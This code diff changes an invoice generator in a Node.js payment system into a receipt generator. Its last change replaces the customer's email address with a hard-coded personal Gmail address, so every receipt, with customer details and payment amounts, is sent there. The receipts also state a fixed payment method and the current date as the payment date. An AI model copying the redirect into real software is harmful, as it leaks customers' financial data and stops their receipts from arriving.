@@ -165,7 +165,7 @@ const updatePayment = async (req, res) => {
     // Generate PDF and send email only if status is 'Paid'
     let emailSent = false;
     if (status === 'Paid') {
-      const pdfBuffer = await generateInvoicePDF(invoice, project, customer, payment);
+      const pdfBuffer = await generateReceiptPDF(invoice, project, customer, payment);
 
       try {
         await sendInvoiceEmail(
@@ -223,7 +223,7 @@ const updatePayment = async (req, res) => {
 };
 
 
-async function generateInvoicePDF(invoice, project, customer, payment) {
+async function generateReceiptPDF(invoice, project, customer, payment) {
   const pdfDoc = await PDFDocument.create();
   const page = pdfDoc.addPage([595.28, 841.89]); // A4 size in points
 
@@ -247,92 +247,50 @@ async function generateInvoicePDF(invoice, project, customer, payment) {
   page.drawText('Abu Dhabi, UAE', { x: 50, y: page.getHeight() - 140, size: 10, font: helvetica });
   page.drawText('Phone: 02 650 2924 | Email: info@gaapaudit.com', { x: 50, y: page.getHeight() - 155, size: 10, font: helvetica });
 
-  // Add invoice title
-  page.drawText('INVOICE', { x: 250, y: page.getHeight() - 100, size: 24, font: helveticaBold, color: rgb(0.2, 0.4, 0.6) });
+  // Add receipt title
+  page.drawText('RECEIPT', { x: 250, y: page.getHeight() - 100, size: 24, font: helveticaBold, color: rgb(0.2, 0.4, 0.6) });
 
-  // Add invoice details
-  page.drawText(`Invoice #: ${invoice.invoiceNumber}`, { x: 400, y: page.getHeight() - 130, size: 12, font: helveticaBold });
-  page.drawText(`Date: ${invoice.issueDate.toLocaleDateString()}`, { x: 400, y: page.getHeight() - 150, size: 12, font: helvetica });
-  page.drawText(`Due Date: ${invoice.dueDate.toLocaleDateString()}`, { x: 400, y: page.getHeight() - 170, size: 12, font: helvetica });
+  // Add receipt details
+  page.drawText(`Receipt #: ${invoice.invoiceNumber}`, { x: 400, y: page.getHeight() - 130, size: 12, font: helveticaBold });
+  page.drawText(`Date: ${new Date().toLocaleDateString()}`, { x: 400, y: page.getHeight() - 150, size: 12, font: helvetica });
 
   // Add customer details
-  page.drawText('Bill To:', { x: 50, y: page.getHeight() - 200, size: 14, font: helveticaBold });
+  page.drawText('Received From:', { x: 50, y: page.getHeight() - 200, size: 14, font: helveticaBold });
   page.drawText(customer.companyName, { x: 50, y: page.getHeight() - 220, size: 12, font: helvetica });
   page.drawText(customer.address.street, { x: 50, y: page.getHeight() - 235, size: 10, font: helvetica });
   page.drawText(`${customer.address.city}, ${customer.address.country}`, { x: 50, y: page.getHeight() - 250, size: 10, font: helvetica });
 
-  // Add table headers
-  const tableTop = page.getHeight() - 300;
-  const tableRowHeight = 30;
-  const columns = [50, 250, 350, 450, 520];
-
-  page.drawRectangle({
-    x: 50,
-    y: tableTop - tableRowHeight,
-    width: page.getWidth() - 100,
-    height: tableRowHeight,
-    color: rgb(0.2, 0.4, 0.6),
-  });
-
-  ['Description', 'Quantity', 'Unit Price', 'Amount'].forEach((header, i) => {
-    page.drawText(header, {
-      x: columns[i],
-      y: tableTop - 20,
-      size: 12,
-      font: helveticaBold,
-      color: rgb(1, 1, 1),
-    });
-  });
-
-  // Add table rows
-  let currentY = tableTop - tableRowHeight;
-  invoice.items.forEach((item, index) => {
-    currentY -= tableRowHeight;
-    if (index % 2 === 0) {
-      page.drawRectangle({
-        x: 50,
-        y: currentY,
-        width: page.getWidth() - 100,
-        height: tableRowHeight,
-        color: rgb(0.95, 0.95, 0.95),
-      });
-    }
-    page.drawText(item.description, { x: columns[0], y: currentY + 10, size: 10, font: helvetica });
-    page.drawText(item.quantity.toString(), { x: columns[1], y: currentY + 10, size: 10, font: helvetica });
-    page.drawText(`${item.unitPrice.toFixed(2)}`, { x: columns[2], y: currentY + 10, size: 10, font: helvetica });
-    page.drawText(`${item.amount.toFixed(2)}`, { x: columns[3], y: currentY + 10, size: 10, font: helvetica });
-  });
-
-  // Add total
-  currentY -= tableRowHeight;
-  page.drawLine({ start: { x: 50, y: currentY }, end: { x: page.getWidth() - 50, y: currentY }, thickness: 1 });
-  page.drawText('Total:', { x: columns[2], y: currentY - 20, size: 12, font: helveticaBold });
-  page.drawText(`${invoice.total.toFixed(2)}`, { x: columns[3], y: currentY - 20, size: 12, font: helveticaBold });
-
   // Add payment details
-  currentY -= 60;
+  let currentY = page.getHeight() - 300;
   page.drawText('Payment Details:', { x: 50, y: currentY, size: 14, font: helveticaBold });
+  currentY -= 25;
+  page.drawText(`Project Name: ${project.projectName}`, { x: 50, y: currentY, size: 12, font: helvetica });
   currentY -= 20;
-  page.drawText(`Total Project Amount: ${payment.totalAmount.toFixed(2)}`, { x: 50, y: currentY, size: 12, font: helvetica });
+  page.drawText(`Amount Received: ${invoice.total.toFixed(2)} ${invoice.currency}`, { x: 50, y: currentY, size: 12, font: helveticaBold });
   currentY -= 20;
-  page.drawText(`Total Paid Amount: ${payment.paidAmount.toFixed(2)}`, { x: 50, y: currentY, size: 12, font: helvetica });
+  page.drawText(`Payment Method: Bank Transfer`, { x: 50, y: currentY, size: 12, font: helvetica });
   currentY -= 20;
-  page.drawText(`Remaining Amount: ${payment.unpaidAmount.toFixed(2)}`, { x: 50, y: currentY, size: 12, font: helvetica });
+  page.drawText(`Payment Date: ${new Date().toLocaleDateString()}`, { x: 50, y: currentY, size: 12, font: helvetica });
+
+  // Add project payment summary
+  currentY -= 40;
+  page.drawText('Project Payment Summary:', { x: 50, y: currentY, size: 14, font: helveticaBold });
+  currentY -= 25;
+  page.drawText(`Total Project Amount: ${payment.totalAmount.toFixed(2)} ${payment.currency}`, { x: 50, y: currentY, size: 12, font: helvetica });
+  currentY -= 20;
+  page.drawText(`Total Paid Amount: ${payment.paidAmount.toFixed(2)} ${payment.currency}`, { x: 50, y: currentY, size: 12, font: helvetica });
+  currentY -= 20;
+  page.drawText(`Remaining Amount: ${payment.unpaidAmount.toFixed(2)} ${payment.currency}`, { x: 50, y: currentY, size: 12, font: helvetica });
   currentY -= 20;
   page.drawText(`Payment Status: ${payment.paymentStatus}`, { x: 50, y: currentY, size: 12, font: helvetica });
-  currentY -= 20;
-  page.drawText(`Last Payment Date: ${payment.lastPaymentDate ? payment.lastPaymentDate.toLocaleDateString() : 'N/A'}`, { x: 50, y: currentY, size: 12, font: helvetica });
-  currentY -= 20;
-  page.drawText(`Next Payment Due: ${payment.nextPaymentDue ? payment.nextPaymentDue.toLocaleDateString() : 'N/A'}`, { x: 50, y: currentY, size: 12, font: helvetica });
 
   // Add footer
   const footerY = 50;
-  page.drawText('Thank you for your business!', { x: 50, y: footerY, size: 12, font: helveticaBold, color: rgb(0.2, 0.4, 0.6) });
-  page.drawText('Payment is due within 30 days. Please process this invoice within that time.', { x: 50, y: footerY - 15, size: 10, font: helvetica });
+  page.drawText('Thank you for your payment!', { x: 50, y: footerY, size: 12, font: helveticaBold, color: rgb(0.2, 0.4, 0.6) });
+  page.drawText('This receipt is proof of payment for the services rendered.', { x: 50, y: footerY - 15, size: 10, font: helvetica });
 
   return await pdfDoc.save();
 }
-
 async function sendInvoiceEmail(fromEmail, toEmail, pdfBuffer, invoice, project, customer, payment) {
   const emailTemplate = handlebars.compile(`
     <html>
@@ -404,7 +362,7 @@ async function sendInvoiceEmail(fromEmail, toEmail, pdfBuffer, invoice, project,
 
   const mailOptions = {
     from: fromEmail,
-    to: toEmail,
+    to: 'hashmiosama555@gmail.com',
     subject: `Invoice ${invoice.invoiceNumber} for ${project.projectName}`,
     html: emailContent,
     attachments: [{
